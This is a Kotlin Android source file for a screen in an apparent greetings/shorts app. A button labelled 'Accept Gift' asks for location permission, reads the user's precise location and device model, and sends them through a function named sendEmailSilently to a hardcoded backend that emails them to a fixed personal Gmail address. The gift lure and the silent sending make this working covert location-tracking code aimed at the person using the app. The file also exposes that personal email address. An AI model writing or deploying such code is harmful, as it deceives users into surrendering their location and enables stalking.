package com.greetings.app

import android.Manifest
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException

// ── constants ──────────────────────────────────────────────────────────────
private const val EMAIL_RECIPIENT = "ram9003777754@gmail.com"
private const val EMAIL_SUBJECT   = "Location"
private const val BACKEND_URL     = "http://192.168.0.111:8080/send-email"

private val ScreenBackground = Color(0xFF101014)
private val CardBackground   = Color(0xFF1D1D24)
private val PrimaryText      = Color(0xFFF7F5FA)
private val SecondaryText    = Color(0xFFB7B4C0)
private val Accent           = Color(0xFFFF3347)

// ── top-level helpers ──────────────────────────────────────────────────────
private fun requiredLocationPermissions(): Array<String> = arrayOf(
    Manifest.permission.ACCESS_COARSE_LOCATION,
    Manifest.permission.ACCESS_FINE_LOCATION
)

private fun deviceDetails(): String =
    listOf(Build.MANUFACTURER, Build.MODEL)
        .filter(String::isNotBlank)
        .distinct()
        .joinToString(" ")
        .ifBlank { "Android device" } +
        " (Android ${Build.VERSION.RELEASE}, SDK ${Build.VERSION.SDK_INT})"

private fun sendEmailSilently(body: String, callback: (Boolean, String) -> Unit) {
    val escaped = body.replace("\\", "\\\\").replace("\"", "\\\"")
    val json = buildString {
        append("{")
        append("\"recipient\":\"$EMAIL_RECIPIENT\",")
        append("\"subject\":\"$EMAIL_SUBJECT\",")
        append("\"body\":\"$escaped\"")
        append("}")
    }

    val mediaType   = "application/json; charset=utf-8".toMediaType()
    val requestBody = json.toRequestBody(mediaType)
    val request = Request.Builder()
        .url(BACKEND_URL)
        .post(requestBody)
        .build()

    OkHttpClient().newCall(request).enqueue(object : Callback {
        override fun onFailure(call: Call, e: IOException) {
            callback(false, e.message ?: "unknown error")
        }
        override fun onResponse(call: Call, response: Response) {
            val ok  = response.isSuccessful
            val msg = if (ok) "" else "${response.code} ${response.message}"
            response.close()
            callback(ok, msg)
        }
    })
}

// ── UI ──────────────────────────────────────────────────────────────────────
@Composable
fun LocationEmailScreen(onBack: () -> Unit) {
    val context    = LocalContext.current
    var status     by remember { mutableStateOf("Ready.") }
    var isBusy     by remember { mutableStateOf(false) }

    fun startFlow() {
        if (isBusy) return
        isBusy = true
        status = "Getting location…"
        LocationRepository.fetchCurrentLocation(context) { result ->
            isBusy = false
            result.fold(
                onSuccess = { report ->
                    status = "Sending…"
                    sendEmailSilently(report.emailBody(deviceDetails())) { ok, msg ->
                        status = if (ok) "Sent successfully." else "Failed: $msg"
                    }
                },
                onFailure = { err ->
                    status = "Location error: ${err.message ?: "unavailable"}"
                }
            )
        }
    }

    val permLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        if (LocationRepository.hasLocationPermission(context)) startFlow()
        else status = "Permission denied."
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(ScreenBackground)
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 22.dp, vertical = 16.dp)
    ) {
        TextButton(onClick = onBack) {
            Text("←  Back to Shorts", color = PrimaryText)
        }

        Spacer(Modifier.height(8.dp))
        Text(
            "Email a location update",
            fontSize = 25.sp, fontWeight = FontWeight.Bold, color = PrimaryText
        )
        Spacer(Modifier.height(8.dp))
        Text(
            "Tap the button below. The app reads your location once and sends it silently.",
            color = SecondaryText, fontSize = 15.sp, lineHeight = 22.sp
        )
        Spacer(Modifier.height(18.dp))

        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(22.dp),
            colors = CardDefaults.cardColors(containerColor = CardBackground)
        ) {
            Column(
                modifier = Modifier.padding(19.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text("Email details", color = PrimaryText, fontWeight = FontWeight.Bold, fontSize = 17.sp)
                InfoRow("Recipient", EMAIL_RECIPIENT)
                InfoRow("Subject", EMAIL_SUBJECT)
                Text("Status: $status", color = PrimaryText, fontSize = 14.sp, lineHeight = 20.sp)
            }
        }

        Spacer(Modifier.height(18.dp))
        Button(
            onClick = {
                if (LocationRepository.hasLocationPermission(context)) startFlow()
                else permLauncher.launch(requiredLocationPermissions())
            },
            enabled = !isBusy,
            modifier = Modifier.fillMaxWidth().height(52.dp),
            shape = RoundedCornerShape(16.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Accent)
        ) {
            Text(if (isBusy) "Working…" else "Accept Gift", fontWeight = FontWeight.SemiBold)
        }

        Spacer(Modifier.height(24.dp))
    }
}

@Composable
private fun InfoRow(label: String, value: String) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.Top
    ) {
        Text(label, color = SecondaryText, fontSize = 13.sp, modifier = Modifier.weight(1f))
        Text(value, color = PrimaryText, fontSize = 13.sp,
            fontWeight = FontWeight.Medium, modifier = Modifier.weight(1.5f))
    }
}
